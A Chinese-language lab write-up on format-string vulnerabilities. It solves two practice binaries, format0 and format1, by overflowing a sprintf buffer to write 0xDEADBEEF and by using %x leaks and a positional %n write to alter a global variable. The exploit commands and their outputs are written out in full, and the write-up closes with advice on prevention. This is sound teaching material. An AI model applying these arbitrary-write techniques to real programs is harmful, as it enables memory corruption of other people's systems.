# <center>格式化字符串实验1</center>

## 实验概述

### 【目的】
1. 运行format0，得到输出`you have hit the target correctly :)`，要求输入的参数不超过十个字节。
2. 运行format1，得到输出`you have modified the target :)`
### 【环境】
Linux
### 【工具】
python
### 【原理】
格式化字符串，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。[1]
## 实验步骤

### 【步骤】

#### format0
```
$ binwalk format0

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)

```
```
int __cdecl vuln(char *format)
{
  int result; // eax@1
  char s; // [sp+Ch] [bp-4Ch]@1
  int v3; // [sp+4Ch] [bp-Ch]@1

  v3 = 0;
  sprintf(&s, format);
  result = v3;
  if ( v3 == 0xDEADBEEF )
    result = puts("you have hit the target correctly :)");
  return result;
}
```
分析`vuln()`函数可以发现，s字符数组和变量v3相邻，可以通过sprintf()来溢出控制v3的值。
另外一个要求是不超过十个字符，这里可以使用格式化字符的占位符来输入64
```
$ python -c 'print "%64d\xef\xbe\xad\xde"' | xargs ./format0
you have hit the target correctly :)

```

#### foramt1

```
$ binwalk format1

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             ELF, 32-bit LSB executable, Intel 80386, version 1 (SYSV)

```
```
int __cdecl vuln(char *format)
{
  int result; // eax@1

  printf(format);
  result = target;
  if ( target )
    result = puts("you have modified the target :)");
  return result;
}
```
双击target变量，发现是存在bss段的全局变量。
```
.bss:0804A024 target          dd ?                    ; DATA XREF: vuln+14r
.bss:0804A024 _bss            ends
.bss:0804A024
```
target 变量的地址也可以使用objdump求得
```
$ objdump -t format1 | grep target
0804a024 g     O .bss	00000004              target
23
```
注意到`printf()`直接把format作为参数，意味着这里存在一个格式化字符串漏洞。
首先要求得format的偏移量。
```
$ ./format1 AAAA`python -c 'print ".".join(["%d:%%x" % i for i in range(1,200)])'`
AAAA1:f7fb6000.2:f7fb4244.3:f7e1e0ec.4:2.5:0.6:ffffca58.7:804848f.8:ffffcd07.9:ffffcb04.10:ffffcb10.11:80484c1.12:f7fb63dc.13:ffffca70.14:0.15:f7e1e637.16:f7fb6000.17:f7fb6000.18:0.19:f7e1e637.20:2.21:ffffcb04.22:ffffcb10.23:0.24:0.25:0.26:f7fb6000.27:f7ffdc04.28:f7ffd000.29:0.30:f7fb6000.31:f7fb6000.32:0.33:49b7bdb.34:38c475cb.35:0.36:0.37:0.38:2.39:8048340.40:0.41:f7feeff0.42:f7fe9880.43:f7ffd000.44:2.45:8048340.46:0.47:8048361.48:804846b.49:2.50:ffffcb04.51:80484a0.52:8048500.53:f7fe9880.54:ffffcafc.55:f7ffd918.56:2.57:ffffccfd.58:ffffcd07.59:0.60:ffffd210.61:ffffd21b.62:ffffd230.63:ffffd247.64:ffffd259.65:ffffd28c.66:ffffd2a4.67:ffffd2bb.68:ffffd2ca.69:ffffd2fe.70:ffffd312.71:ffffd323.72:ffffd33a.73:ffffd34a.74:ffffd36d.75:ffffd37f.76:ffffd396.77:ffffd3da.78:ffffd3f1.79:ffffd41e.80:ffffd42b.81:ffffd9b3.82:ffffd9c6.83:ffffd9df.84:ffffda19.85:ffffda4d.86:ffffda76.87:ffffdac8.88:ffffdafb.89:ffffdb3f.90:ffffdb56.91:ffffdbe9.92:ffffdbfb.93:ffffdc1c.94:ffffdc3a.95:ffffdc4f.96:ffffdc69.97:ffffdc72.98:ffffdc86.99:ffffdc99.100:ffffdcaa.101:ffffdcb9.102:ffffdcef.103:ffffdd0a.104:ffffdd27.105:ffffdd39.106:ffffdd4a.107:ffffdd5c.108:ffffdd76.109:ffffdd95.110:ffffdd9d.111:ffffddb0.112:ffffddbf.113:ffffddd1.114:ffffddfd.115:ffffde18.116:ffffde28.117:ffffde64.118:ffffdeca.119:ffffdedd.120:ffffdefd.121:ffffdf07.122:ffffdf26.123:ffffdf31.124:ffffdf4b.125:ffffdf5e.126:ffffdf80.127:ffffdf94.128:ffffdfa8.129:ffffdfcd.130:ffffdfd9.131:0.132:20.133:f7fd8dc0.134:21.135:f7fd8000.136:10.137:f8bfbff.138:6.139:1000.140:11.141:64.142:3.143:8048034.144:4.145:20.146:5.147:9.148:7.149:f7fda000.150:8.151:0.152:9.153:8048340.154:b.155:3e8.156:c.157:3e8.158:d.159:3e8.160:e.161:3e8.162:17.163:0.164:19.165:ffffccdb.166:1a.167:0.168:1f.169:ffffdfee.170:f.171:ffffcceb.172:0.173:0.174:e0000000.175:cd2f73a2.176:fd127d87.177:68381562.178:69d375ee.179:363836.180:0.181:0.182:0.183:662f2e00.184:616d726f.185:41003174.186:31414141.187:2e78253a.188:78253a32.189:253a332e.190:3a342e78.191:352e7825.192:2e78253a.193:78253a36.194:253a372e.195:3a382e78.196:392e7825.197:2e78253a.198:253a3031.199:31312e78
```
%x表示按十六进制输出。
可以发现在185偏移附近有重复出现的0x41，我们挨个进行试探。
```
lometsj@ubuntu:~/prostar$ ./format1 `python -c 'print "ABCD" + "X" * 4 + "%186$x."'`
ABCDXXXX36383125.
lometsj@ubuntu:~/prostar$ ./format1 `python -c 'print "ABCD" + "X" * 4 + "%185$x."'`
ABCDXXXX58585858.
lometsj@ubuntu:~/prostar$ ./format1 `python -c 'print "ABCD" + "X" * 4 + "%184$x."'`
ABCDXXXX44434241.
```
在偏移等于184时，刚好输出0x44434241，即'ABCD'。
这里引入另外一个格式化符号%n，%n与其他格式说明符号不同。%n不向printf传递格式化信息，而是令printf把自己到该点已打出的字符总数放到相应变元指向的整形变量中。
通常来说，%n是这样使用的。
```
      strlen('abcd----')
          |           |
          |           |
printf("abcd-----%n",&len)

(len = strlen('abcd----'))
```
在这道题中，184偏移位置的值等于我们输入数据的前4位，那么我们置前四位为target变量的地址，并在184偏移处使用%n格式化，就会令target变量得到一个非零的赋值。
```
$ ./format1 `python -c 'print "\x24\xa0\x04\x08" + "X" * 4 + "%184$n."'`
$�XXXX.you have modified the target :)

```
### 【总结】
本次实验主要熟悉了格式化字符串的溢出，通过%x泄露内存数据，通过%n来进行任意地址写的漏洞。

可以发现，格式化字符串漏洞发生的原因是程序将格式化字符串的权限交给用户，即用户可以操作格式化字符串的内容。

要预防这类情况，在使用格式化字符串函数时，format参数的权限一定不能交给用户。